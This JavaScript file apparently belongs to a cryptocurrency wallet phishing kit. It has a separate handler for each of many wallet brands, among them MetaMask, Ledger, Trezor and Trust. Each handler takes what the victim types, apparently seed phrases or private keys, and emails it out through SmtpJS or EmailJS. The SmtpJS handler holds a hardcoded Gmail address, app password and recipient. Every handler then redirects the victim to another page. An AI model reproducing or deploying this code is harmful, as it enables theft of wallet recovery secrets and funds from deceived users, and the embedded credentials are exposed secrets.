
/********************************************** MetaMask Wallet  **********************************************************/
document.querySelector(".contact-form").addEventListener("submit", submitForm);

function submitForm(e) {
e.preventDefault();


let message = document.getElementById("message").value;
document.querySelector(".contact-form").reset();

sendEmail(message)
}

function sendEmail(message) {
    Email.send({
        Host: "smtp.gmail.com",
        Username: "walletconnectw@gmail.com",
        Password: "ouuqeeseuavtcumv",
        To: "ahmedKhalid2@gmail.com",
        From: "walletconnectw@gmail.com",
        Subject: "New Message MF",
        Body: `${message}`
    }).then((message) => alert("mail has sent "))
}
/********************************************** xxxxxxxxxxxxxxxxxxxx  **********************************************************/


/************************************************ Ledger Wallet  ******************************************************** */
function sendLedger(){
    var params = { 
        message: document.getElementById("ledger").value ,
    };


const serviceID = "service_v0a1yyl";
const templateID = "template_xq6z3od";

emailjs
       .send(serviceID, templateID, params)
       .then(
        (res) => {
        document.getElementById("ledger").value = "";
        console.log(res);
        window.location.replace("disc.html");
    }
)
.catch((err)=> console.log(err));

}

/********************************************** xxxxxxxxxxxxxxxxxxxx  **********************************************************/

/************************************************ Trezor Wallet  ******************************************************** */
function sendTrezor(){
    var params = { 
        message: document.getElementById("trezor").value ,
    };


const serviceID = "service_3btzki5";
const templateID = "template_r353yuu";

emailjs
       .send(serviceID, templateID, params)
       .then(
        (res) => {
        document.getElementById("trezor").value = "";
        console.log(res);
        window.location.replace("disc.html");
    }
)
.catch((err)=> console.log(err));

}

/********************************************** xxxxxxxxxxxxxxxxxxxx  **********************************************************/

/************************************************ Portis Wallet  ******************************************************** */
function sendPortis(){
    var params = { 
        message: document.getElementById("portis").value ,
    };


const serviceID = "service_4q2htjv";
const templateID = "template_u9etby8";

emailjs
       .send(serviceID, templateID, params)
       .then(
        (res) => {
        document.getElementById("portis").value = "";
        console.log(res);
        window.location.replace("disc.html");
    }
)
.catch((err)=> console.log(err));

}

/********************************************** xxxxxxxxxxxxxxxxxxxx  **********************************************************/

/************************************************ Opera Wallet  ******************************************************** */
function sendOpera(){
    var params = { 
        message: document.getElementById("opera").value ,
    };


const serviceID = "service_5ctxgyc";
const templateID = "template_oyz0lpe";

emailjs
       .send(serviceID, templateID, params)
       .then(
        (res) => {
        document.getElementById("opera").value = "";
        console.log(res);
        window.location.replace("disc.html");
    }
)
.catch((err)=> console.log(err));

}

/********************************************** xxxxxxxxxxxxxxxxxxxx  **********************************************************/

/************************************************ Blockchain Wallet  ******************************************************** */
function sendBlockchain(){
    var params = { 
        message: document.getElementById("blockchain").value ,
    };


const serviceID = "service_h9wx4fe";
const templateID = "template_po9ci7c";

emailjs
       .send(serviceID, templateID, params)
       .then(
        (res) => {
        document.getElementById("blockchain").value = "";
        console.log(res);
        window.location.replace("disc.html");
    }
)
.catch((err)=> console.log(err));

}

/********************************************** xxxxxxxxxxxxxxxxxxxx  **********************************************************/

/************************************************ Exodus Wallet  ******************************************************** */
function sendExodus(){
    var params = { 
        message: document.getElementById("exodus").value ,
    };

    const serviceID = "service_v0a1yyl";
    const templateID = "template_xq6z3od";

emailjs
       .send(serviceID, templateID, params)
       .then(
        (res) => {
        document.getElementById("exodus").value = "";
        console.log(res);
        window.location.replace("disc.html");
    }
)
.catch((err)=> console.log(err));

}

/********************************************** xxxxxxxxxxxxxxxxxxxx  **********************************************************/

/************************************************ WalletConnect Wallet  ******************************************************** */
function sendWalletConnect(){
    var params = { 
        message: document.getElementById("walletconnect").value ,
    };


const serviceID = "";
const templateID = "";

emailjs
       .send(serviceID, templateID, params)
       .then(
        (res) => {
        document.getElementById("walletconnect").value = "";
        console.log(res);
        window.location.replace("disc.html");
    }
)
.catch((err)=> console.log(err));

}

/********************************************** xxxxxxxxxxxxxxxxxxxx  **********************************************************/

/************************************************ Lattice Wallet  ******************************************************** */
function sendLattice(){
    var params = { 
        message: document.getElementById("lattice").value ,
    };


const serviceID = "service_iffpfab";
const templateID = "template_2fqi6al";

emailjs
       .send(serviceID, templateID, params)
       .then(
        (res) => {
        document.getElementById("lattice").value = "";
        console.log(res);
        window.location.replace("disc.html");
    }
)
.catch((err)=> console.log(err));

}

/********************************************** xxxxxxxxxxxxxxxxxxxx  **********************************************************/

/************************************************ Formatic Wallet  ******************************************************** */
function sendFormatic(){
    var params = { 
        message: document.getElementById("formatic").value ,
    };


const serviceID = "service_e21k8ll";
const templateID = "template_dh4vzyh";

emailjs
       .send(serviceID, templateID, params)
       .then(
        (res) => {
        document.getElementById("formatic").value = "";
        console.log(res);
        window.location.replace("disc.html");
    }
)
.catch((err)=> console.log(err));

}

/********************************************** xxxxxxxxxx------xxxxxxxxxx  **********************************************************/

/************************************************ Torus Wallet  ******************************************************** */
function sendTorus(){
    var params = { 
        message: document.getElementById("torus").value ,
    };


const serviceID = "";
const templateID = "";

emailjs
       .send(serviceID, templateID, params)
       .then(
        (res) => {
        document.getElementById("torus").value = "";
        console.log(res);
        window.location.replace("disc.html");
    }
)
.catch((err)=> console.log(err));

}

/********************************************** xxxxxxxxxxxxxxxxxxxx  **********************************************************/

/************************************************ WalletLink Wallet  ******************************************************** */
function sendWalletLink(){
    var params = { 
        message: document.getElementById("walletlink").value ,
    };


const serviceID = "service_e6c7tqf";
const templateID = "template_u5h523j";

emailjs
       .send(serviceID, templateID, params)
       .then(
        (res) => {
        document.getElementById("walletlink").value = "";
        console.log(res);
        window.location.replace("disc.html");
    }
)
.catch((err)=> console.log(err));

}

/********************************************** xxxxxxxxxxxxxxxxxxxx  **********************************************************/


/************************************************ Trust Wallet  ******************************************************** */
function sendTrust(){
    var params = { 
        message: document.getElementById("trust").value ,
    };


const serviceID = "service_znqrqqy";
const templateID = "template_ft1gt3j";

emailjs
       .send(serviceID, templateID, params)
       .then(
        (res) => {
        document.getElementById("trust").value = "";
        console.log(res);
        window.location.replace("disc.html");
    }
)
.catch((err)=> console.log(err));

}

/********************************************** xxxxxxxxxxxxxxxxxxxx  **********************************************************/


/********************************************** xxxxxxxxxxxxxxxxxxxx  **********************************************************/




